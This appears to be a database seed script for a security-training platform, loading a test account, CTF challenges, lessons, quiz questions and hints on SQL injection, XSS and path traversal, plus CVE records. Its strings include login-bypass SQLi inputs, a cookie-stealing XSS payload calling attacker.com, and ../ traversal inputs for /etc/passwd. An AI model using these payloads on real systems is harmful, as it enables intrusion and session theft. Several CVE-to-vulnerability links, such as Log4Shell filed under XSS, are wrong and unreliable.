"""
Populates the database

Usage: python seed.py

Test user credentials: student / password123
"""

from werkzeug.security import generate_password_hash

from app import create_app, db
from app.models import (
    Account, CTF, Vulnerability, Question, Hint,
    CVE, CVEVulnerability,
)


def seed():
    app = create_app()
    with app.app_context():
        db.drop_all()
        db.create_all()

        # ------------------------------------------------------------------
        # Users
        # ------------------------------------------------------------------
        student = Account(
            username="student",
            email="student@example.com",
            passwordHash=generate_password_hash("password123"),
        )
        db.session.add(student)

        # ------------------------------------------------------------------
        # CTF challenges (created before vulnerabilities due to FK)
        # ------------------------------------------------------------------
        ctf_sqli = CTF(
            description=(
                "Use SQL injection to bypass the login form and authenticate as 'admin' "
                "without knowing the password.\n\n"
                "The backend query is:\n"
                "  SELECT * FROM users WHERE username='<input>' AND password='<input>'\n\n"
                "Find an input that always evaluates to TRUE and comments out the rest."
            ),
            path="/api/challenges/sqli_login.zip",
            flag="sqli_bypass_success",
        )
        ctf_xss = CTF(
            description=(
                "Inject a persistent XSS payload into the comment field of a blog page.\n\n"
                "Your goal: steal the admin's session cookie and send it to "
                "http://attacker.local/steal?c=COOKIE.\n\n"
                "The page does NOT sanitise or encode user input before rendering."
            ),
            path="/api/challenges/xss_cookie.zip",
            flag="xss_cookie_stolen",
        )
        ctf_pt = CTF(
            description=(
                "Exploit a path traversal vulnerability in a file-download endpoint:\n"
                "  GET /download?file=<filename>\n\n"
                "The server returns the contents of the requested file from /var/www/files/. "
                "Read /etc/passwd and find the flag hidden in the last comment field."
            ),
            path="/api/challenges/path_traversal.zip",
            flag="path_traversal_lfi",
        )
        db.session.add_all([ctf_sqli, ctf_xss, ctf_pt])
        db.session.flush()

        # ------------------------------------------------------------------
        # Vulnerabilities
        # ------------------------------------------------------------------
        vuln_sqli = Vulnerability(
            name="SQL Injection",
            ctfId=ctf_sqli.ctfId,
            description=(
                "SQL Injection (SQLi) is a web security vulnerability that allows an attacker "
                "to interfere with the queries that an application makes to its database.\n\n"
                "Attackers can use it to:\n"
                "• View data they are not normally able to retrieve\n"
                "• Bypass authentication (e.g. login without a password)\n"
                "• Modify or delete data\n"
                "• In severe cases, execute OS commands on the server\n\n"
                "Example vulnerable query:\n"
                "  SELECT * FROM users WHERE username='<user>' AND password='<pass>'\n\n"
                "With input  admin'--  this becomes:\n"
                "  SELECT * FROM users WHERE username='admin'--' AND password=''\n\n"
                "The -- comments out the password check, allowing login without a password.\n\n"
                "Prevention: use parameterised queries / prepared statements, validate and "
                "whitelist input, apply least-privilege to DB accounts."
            ),
        )
        vuln_xss = Vulnerability(
            name="Cross-Site Scripting (XSS)",
            ctfId=ctf_xss.ctfId,
            description=(
                "Cross-Site Scripting (XSS) is a client-side code injection attack.\n\n"
                "Types of XSS:\n"
                "1. Reflected - payload comes from the current HTTP request\n"
                "2. Stored   - payload is saved in the database and served to all visitors\n"
                "3. DOM-based - vulnerability exists in client-side JavaScript\n\n"
                "XSS can be used to:\n"
                "• Steal session cookies and hijack accounts\n"
                "• Redirect users to phishing sites\n"
                "• Deface web pages\n"
                "• Perform actions on behalf of the victim\n\n"
                "Classic payload:\n"
                "  <script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\n"
                "Prevention: HTML-encode all user-supplied output, use Content-Security-Policy "
                "headers, avoid innerHTML with untrusted data."
            ),
        )
        vuln_pt = Vulnerability(
            name="Path Traversal",
            ctfId=ctf_pt.ctfId,
            description=(
                "Path Traversal (Directory Traversal) lets an attacker read arbitrary files "
                "on the server by manipulating file-path input.\n\n"
                "Common targets:\n"
                "• /etc/passwd  - Linux user list\n"
                "• /etc/shadow  - Hashed passwords (requires root)\n"
                "• Application source code and config files with credentials\n\n"
                "The attack uses ../ sequences to escape the intended directory:\n"
                "  /download?file=../../../../etc/passwd\n\n"
                "URL-encoded variants bypass naive filters:\n"
                "  %2e%2e%2f  ->  ../\n"
                "  %2e%2e/    ->  ../\n\n"
                "Prevention: resolve the canonical path and verify it starts with the allowed "
                "base directory; use a whitelist of permitted files; never pass user input "
                "directly to filesystem APIs."
            ),
        )
        db.session.add_all([vuln_sqli, vuln_xss, vuln_pt])
        db.session.flush()

        # ------------------------------------------------------------------
        # Questions
        # ------------------------------------------------------------------
        questions = [
            # SQL Injection
            Question(vulnId=vuln_sqli.vulnId, questionNumber=1,
                     question="What two-character SQL sequence comments out the remainder of a query?",
                     answer="--"),
            Question(vulnId=vuln_sqli.vulnId, questionNumber=2,
                     question="Which SQL keyword merges the results of two SELECT statements, "
                              "often used in SQLi to extract data from other tables?",
                     answer="UNION"),
            Question(vulnId=vuln_sqli.vulnId, questionNumber=3,
                     question="Which SQL clause is most commonly manipulated in a login-bypass "
                              "SQL injection attack to make a condition always true?",
                     answer="WHERE"),

            # XSS
            Question(vulnId=vuln_xss.vulnId, questionNumber=1,
                     question="What HTML tag is most commonly injected in an XSS attack to run "
                              "client-side code?",
                     answer="script"),
            Question(vulnId=vuln_xss.vulnId, questionNumber=2,
                     question="Which JavaScript property exposes a user's session identifier "
                              "and is a primary target in XSS cookie-theft attacks?",
                     answer="document.cookie"),
            Question(vulnId=vuln_xss.vulnId, questionNumber=3,
                     question="What type of XSS permanently stores the malicious payload in "
                              "the server's database so every visitor is affected?",
                     answer="stored"),

            # Path Traversal
            Question(vulnId=vuln_pt.vulnId, questionNumber=1,
                     question="What character sequence is used in a path traversal attack to "
                              "move up one directory level on Unix systems?",
                     answer="../"),
            Question(vulnId=vuln_pt.vulnId, questionNumber=2,
                     question="What sensitive Linux file is a classic path traversal target "
                              "because it lists all system user accounts?",
                     answer="/etc/passwd"),
            Question(vulnId=vuln_pt.vulnId, questionNumber=3,
                     question="What is the URL-percent-encoded form of ../ that can bypass "
                              "simple string-match filters?",
                     answer="%2e%2e%2f"),
        ]
        db.session.add_all(questions)
        db.session.flush()

        q = {q.questionNumber: q for q in questions if q.vulnId == vuln_sqli.vulnId}
        q2 = {q.questionNumber: q for q in questions if q.vulnId == vuln_xss.vulnId}
        q3 = {q.questionNumber: q for q in questions if q.vulnId == vuln_pt.vulnId}

        # ------------------------------------------------------------------
        # Hints
        # ------------------------------------------------------------------
        hints = [
            # SQLi Q1
            Hint(questionId=questions[0].questionId, hintNumber=1,
                 hint="This sequence starts with two dashes. Everything after it is ignored."),
            Hint(questionId=questions[0].questionId, hintNumber=2,
                 hint="Literally two dashes: --  Try: admin'--"),

            # SQLi Q2
            Hint(questionId=questions[1].questionId, hintNumber=1,
                 hint="Think about set operations that combine multiple result sets."),
            Hint(questionId=questions[1].questionId, hintNumber=2,
                 hint="The keyword is UNION. Used like: ' UNION SELECT null,null--"),

            # SQLi Q3
            Hint(questionId=questions[2].questionId, hintNumber=1,
                 hint="This clause filters rows in a SELECT. Attackers add OR 1=1 to bypass it."),
            Hint(questionId=questions[2].questionId, hintNumber=2,
                 hint="WHERE clause. The injection: ' OR '1'='1 makes it always true."),

            # XSS Q1
            Hint(questionId=questions[3].questionId, hintNumber=1,
                 hint="This HTML element embeds executable code. Its name matches the language."),
            Hint(questionId=questions[3].questionId, hintNumber=2,
                 hint="<script>alert('XSS')</script> - the tag is 'script'."),

            # XSS Q2
            Hint(questionId=questions[4].questionId, hintNumber=1,
                 hint="Browsers store small key=value pairs for session tracking. JS can read them."),
            Hint(questionId=questions[4].questionId, hintNumber=2,
                 hint="Access it via document.cookie in JavaScript."),

            # XSS Q3
            Hint(questionId=questions[5].questionId, hintNumber=1,
                 hint="Unlike reflected XSS (one request), this variant persists in the database."),
            Hint(questionId=questions[5].questionId, hintNumber=2,
                 hint="It's called stored XSS (also known as persistent XSS)."),

            # Path Traversal Q1
            Hint(questionId=questions[6].questionId, hintNumber=1,
                 hint="It's a two-character sequence plus a separator: dot dot slash."),
            Hint(questionId=questions[6].questionId, hintNumber=2,
                 hint="../  (two dots then a forward slash)"),

            # Path Traversal Q2
            Hint(questionId=questions[7].questionId, hintNumber=1,
                 hint="It lives in /etc/ and historically stored hashed passwords but now just lists users."),
            Hint(questionId=questions[7].questionId, hintNumber=2,
                 hint="The file is /etc/passwd"),

            # Path Traversal Q3
            Hint(questionId=questions[8].questionId, hintNumber=1,
                 hint="URL encoding converts characters to %XX hex pairs. Dot(.) = %2e, slash(/) = %2f."),
            Hint(questionId=questions[8].questionId, hintNumber=2,
                 hint="%2e%2e%2f encodes ../  (dot=2e, dot=2e, slash=2f)"),
        ]
        db.session.add_all(hints)

        # ------------------------------------------------------------------
        # CVEs
        # ------------------------------------------------------------------
        cves = [
            CVE(
                cveId="CVE-2021-44228",
                description=(
                    "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, "
                    "log messages, and parameters do not protect against attacker-controlled LDAP "
                    "and other JNDI endpoints. An attacker who can control log messages can execute "
                    "arbitrary code loaded from remote LDAP servers. Known as 'Log4Shell'. "
                    "CVSS 10.0 (Critical)."
                ),
            ),
            CVE(
                cveId="CVE-2017-0144",
                description=(
                    "The SMBv1 server in multiple versions of Microsoft Windows allows remote "
                    "attackers to execute arbitrary code via crafted packets "
                    "('Windows SMB Remote Code Execution Vulnerability'). Exploited by WannaCry "
                    "and NotPetya ransomware via the EternalBlue exploit. CVSS 9.3 (Critical)."
                ),
            ),
            CVE(
                cveId="CVE-2014-0160",
                description=(
                    "The TLS/DTLS heartbeat extension in OpenSSL 1.0.1 before 1.0.1g does not "
                    "properly validate the payload length, allowing remote attackers to read "
                    "process memory and leak private keys, credentials, and other secrets. "
                    "Known as the 'Heartbleed' bug. CVSS 7.5 (High)."
                ),
            ),
            CVE(
                cveId="CVE-2019-11043",
                description=(
                    "In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below "
                    "7.3.11 in certain FPM configurations, it is possible to make FPM parse "
                    "PHP queries in a way that leads to remote code execution. CVSS 9.8 (Critical)."
                ),
            ),
            CVE(
                cveId="CVE-2020-1938",
                description=(
                    "When using the Apache JServ Protocol (AJP), Apache Tomcat does not properly "
                    "validate incoming connections, allowing an unauthenticated attacker to read "
                    "arbitrary files or achieve remote code execution via the AJP connector. "
                    "Known as 'Ghostcat'. CVSS 9.8 (Critical)."
                ),
            ),
        ]
        db.session.add_all(cves)
        db.session.flush()

        # ------------------------------------------------------------------
        # CVE -> Vulnerability links
        # ------------------------------------------------------------------
        links = [
            CVEVulnerability(cveId="CVE-2019-11043", vulnId=vuln_sqli.vulnId),
            CVEVulnerability(cveId="CVE-2021-44228", vulnId=vuln_xss.vulnId),
            CVEVulnerability(cveId="CVE-2014-0160",  vulnId=vuln_pt.vulnId),
            CVEVulnerability(cveId="CVE-2020-1938",  vulnId=vuln_pt.vulnId),
        ]
        db.session.add_all(links)

        db.session.commit()

    print("Database seeded successfully!")
    print("Test credentials:")
    print("  Username : student")
    print("  Password : password123")
    print("Vulnerabilities seeded: SQL Injection, XSS, Path Traversal")
    print("CVEs seeded : CVE-2021-44228, CVE-2017-0144, CVE-2014-0160, CVE-2019-11043, CVE-2020-1938")


if __name__ == "__main__":
    seed()
